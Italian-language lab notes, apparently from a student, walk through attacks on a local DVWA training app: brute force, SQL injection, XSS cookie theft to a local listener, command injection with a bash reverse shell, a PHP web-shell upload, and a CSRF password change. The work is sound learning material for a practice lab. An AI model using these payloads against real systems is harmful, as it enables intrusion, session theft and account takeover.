[[PEN testing]]

## Brute force 
- Effettuato sulla pagina http://localhost:8080/vulnerabilities/brute/
- Ho utilizzato hydra come tool principale 
- ho creato appositamente un file pass.txt 
	- questo file contiene poche password, tra cui quella corretta, per provare l'efficacia del tool
- Ho utilizzato il Cookie di accesso, PHPSESSID per poter permettere al tool di accedere ad hydra 
	- di conseguenza questo può essere svolto solo una volta ottenuto l'accesso, o dopo aver conseguito il cookie per la sessione. 
- ![[Screenshot 2026-03-27 111903.png]]
-  La modalità medium di dvwa contiene un delay di 2 secondi per ogni risposta errata e di conseguenza noi troveremo più lentamente la password attraverso brute force. 
	- questo è comunque facilmente superabile grazie al fatto che hydra utilizza una tecnologia multi-hread che permette di arrivare al risultato in modo molto più rapido. 

## SQL injection 
- Qui descrivi dove si trova la vulnerabilità
	- Sezione DVWA: **SQL Injection**
	- Campo input: ID utente
	- Metodo: GET 
	- URL: http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit
- Impostiamo burpsuite in modo tale da poter utilizzare proxy e intercettare la comunicazione. 
	- grazie a questo noi possiamo provare ad iniettare del codice all'interno del server
- ![[Screenshot 2026-03-27 124631.png]]
- come possiamo vedere nella schermata del repeater le sql injection sono possibili in quanto all'iniettando ' noi possiamo generare un errore nel codice sql. 
- attraverso lo stesso metodo noi possiamo semplicemente iniettare 
	- modificando la linea finale con id=1 UNION SELECT user,password FROM users#&Submit=Submit noi possiamo vedere
	- ![[Screenshot 2026-03-27 130237.png]]
- come possiamo notare abbiamo ricevuto i dati richiesti, anche se criptato-i--

## XSS Reflected 
- In questo caso inizio provando ad inserire il comando che possiamo vedere nell'immagine
- ![[Pasted image 20260407112439.png]]
- come possiamo vedere questo è bloccato dato che noi siamo in modalità medium 
- andiamo a utilizzare il codice

```
<img src=x onerror=alert('XSS')>
```
- ![[Pasted image 20260407112701.png]]
- come possiamo vedere qui invece andiamo ad ottenere un esempio di come questo sia vulnerabile. Possiamo utilizzare questa vulnerabilità per svariati motivi, un esempio è quello di rubare il cookie di sessione il che darebbe a me il potere di entrare nell'account bypassando la pagina di login. 
- per dimostrare questo ho deciso di proseguire e approfondire questo argomento. 
- ![[Pasted image 20260407113628.png]]
- prima di tutto creo un http.server nella porta 8888 
- all'interno della pagina io vado ad inserire il codice 
`<img src=x onerror="new Image().src='http://127.0.0.1:8888/steal?cookie='+document.cookie">`
- al dare invio non ho più il popup ma bensì il cookie di sessione della vittima 
- ![[Pasted image 20260407114012.png]]

## XSS Stored
- Questa vulnerabilità funziona in modo simile alla precedente. 
- inietto il codice `<img src=x onerror=alert('XSS')>` in Message
-  ![[Pasted image 20260407114629.png]]
- come possiamo notare nella barra inferiore la sezione messaggio non è visibile, questo significa che è stata eseguita dal server e dunque è vulnerabile. 
- proviamo a rubare i cookie di sessione come in precedenza. Attiviamo il nostro server
-  ![[Pasted image 20260407113628.png]]
- nel campo messaggio bypassiamo il limite di caratteri che possiamo inserire in modo tale da iniettare una linea di codice che ci permetta di inviare il cookie al nostro server. 
- possiamo fare semplicemente ispeziona e cercare il parametro max length
- ![[Pasted image 20260407115824.png]]
- lo modifichiamo in modo tale da avere più caratteri
- una volta fatto ciò possiamo iniettare il codice visibile nell'immagine 
- ![[Pasted image 20260407120006.png]]
## CMD injection 
- Come prima cosa provo ad accedere con i più classici casi di command injection, fallendo. 
![[Pasted image 20260414211115.png]]
- Cerco di provare altri comandi e dopo pochi tentativi noto una vulnerabilità legata alla pipe |
- ![[Pasted image 20260414211433.png]]
- Grazie solo a questa vulnerabilità ho un controllo quasi completo della macchina ma non è l'unico. Ho notato che il filtro del sistema mi permette inoltre di utilizzare un & singolo senza problemi. Qui sotto mostro la gravità del fatto accedendo al file /etc/passwd
- ![[Pasted image 20260414211659.png]]
- come in precedenza io posso avviare un nc -lvnp 4444 ![[Pasted image 20260414215612.png]]
- al iniettare il codice malevolo 127.0.0.1 & bash -c 'bash -i >& /dev/tcp/172.31.81.115/4444 0>&1' io posso controllare la macchina direttamente dal terminale, questo mi concede il controllo totale della macchina. 
- ![[Pasted image 20260414215940.png]]
## File Upload 
- come prima cosa penso alla creazione di una shell php contenente il codice `<?php echo shell_exec($_GET['cmd']); ?>`
- Inseriamolo nella sezione file upload e notiamo come questo non venga accettato dato il controllo di sicurezza. 
- ![[Pasted image 20260415141047.png]]
- per bypassare il controllo noi dobbiamo utilizzare burp suite e inviamo nel repeater. Qui noi andiamo a osservare il content type del file inserito![[Pasted image 20260415141505.png]]
- lo andiamo a modificare sostituendolo con da "application/x-php" a "image/jpeg" e fare con successo l'upload di un file. Grazie a questo noi abbiamo un controllo completo della macchina![[Pasted image 20260415145012.png]]
- possiamo dunque comunicare con la macchina e chiedergli qualsiasi informazione ![[Pasted image 20260415145349.png]]
- Questa vulnerabilità è infatti incredibilmente pericolosa dato che possiamo anche utilizzarla per visualizzare dati sensibili, come il contenuto di /etc/passwd come nell'immagine![[Pasted image 20260415145527.png]]
## CSFR 
- Come primo passo io voglio andare ad utilizzare il servizio normalmente e vedere come funziona attraverso il proxy. ![[Pasted image 20260415125329.png]]
- una volta capito il funzionamento posso procedere alla creazione di una pagine html che sfrutta questa struttura. ![[Pasted image 20260415134609.png]]
- questo infatti nasconde ogni elemento creando una pagina di login falsa che cambierà la password a hacker123 indipendentemente dalla password inserita. Questo file verrà poi inserito nel sistema tramite il file upload come visto in precedenza. Inseriamo dunque questo nel server![[Pasted image 20260415151031.png]]
- qui possiamo vedere che noi abbiamo svariate richieste su burp suite ![[Pasted image 20260415151118.png]]
- la più importante è quella GET da noi fabbricata ![[Pasted image 20260415151210.png]]
- possiamo notare inoltre che in automatico, senza che io necessariamente faccia nulla nella pagina del csfr, avrò questo in schermo ![[Pasted image 20260415151424.png]]
- rendendo la mia password quella che abbiamo deciso nel codice. 
- Questa vulnerabilità è utile per prendere il completo accesso all'account grazie ad un semplice link, che può essere facilmente inviato tramite phishing. 

